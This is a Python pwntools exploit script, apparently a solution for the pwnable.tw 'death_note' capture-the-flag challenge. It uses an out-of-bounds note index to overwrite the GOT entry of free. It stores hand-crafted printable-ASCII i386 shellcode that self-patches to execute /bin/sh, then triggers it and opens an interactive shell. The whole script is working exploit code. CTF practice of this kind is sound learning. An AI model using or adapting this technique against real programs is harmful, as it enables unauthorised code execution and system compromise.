#!/usr/bin/env python3

import pwn
import struct

io = pwn.remote('chall.pwnable.tw', 10201)
elf = pwn.ELF('./death_note')

def del_note(index):
	io.recvuntil('Your choice :')
	io.sendline(str(3))
	io.recvuntil('Index :')
	io.sendline(str(index))

def add_note(index, name):
	io.recvuntil('Your choice :')
	io.sendline(str(1))
	io.recvuntil('Index :')
	io.sendline(str(index))
	io.recvuntil('Name :')
	io.sendline(name)

free_got = elf.got[b'free']
note = elf.sym[b'note']
index = (free_got - note) // 4

pwn.context.arch = 'i386'
shellcode = pwn.asm('''
	push eax
	pop ecx
	push 0x41
	pop eax
	xor al, 0x41
	push eax
	pop edx
	xor eax, [ecx + 0x34]
	xor [ecx + 0x34], eax
	push edx
	pop eax
	dec eax
	dec eax
	xor al, 0x7e
	xor [ecx + 0x35], al
	xor al, 0x4d
	xor [ecx + 0x34], al
	push edx
	push 0x68732f2f
	push 0x6e69622f
	push esp
	pop ebx
	push edx
	pop ecx
	push edx
	pop eax
	xor al, 0x6b
	xor al, 0x60
	pop ebp
	pop ebp
''')

add_note(index, shellcode)
del_note(index)

io.interactive()
